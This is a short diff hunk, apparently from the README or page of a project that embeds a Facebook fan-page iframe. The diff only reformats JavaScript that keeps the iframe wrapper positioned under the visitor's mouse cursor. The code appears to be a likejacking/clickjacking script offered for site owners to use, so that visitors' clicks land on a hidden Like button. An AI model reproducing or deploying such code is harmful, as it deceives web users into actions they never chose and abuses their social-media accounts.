@@ -53,18 +53,18 @@ And then find YOUR_PAGE_URL in src iframe and replace it with your facebook fan 
 <script type="text/javascript">
   var bodyClicked = false;
   var iframeWrapper = document.getElementById('iframe-wrapper');
-  var standardBody=(document.compatMode=="CSS1Compat") ? document.documentElement : document.body 
+  var standardBody = (document.compatMode == "CSS1Compat") ? document.documentElement : document.body;
 
 
   function mouseFollower(e) {
     // for internet explorer
     if (window.event) { 
-      iframeWrapper.style.top = (window.event.y-5)+standardBody.scrollTop+'px';
-      iframeWrapper.style.left = (window.event.x-5)+standardBody.scrollLeft+'px';
+      iframeWrapper.style.top = (window.event.y - 5) + standardBody.scrollTop + 'px';
+      iframeWrapper.style.left = (window.event.x - 5) + standardBody.scrollLeft + 'px';
     }
     else {
-      iframeWrapper.style.top = (e.pageY-5)+'px';
-      iframeWrapper.style.left = (e.pageX-5)+'px';
+      iframeWrapper.style.top = (e.pageY-5) + 'px';
+      iframeWrapper.style.left = (e.pageX-5) + 'px';
     }
   }
 
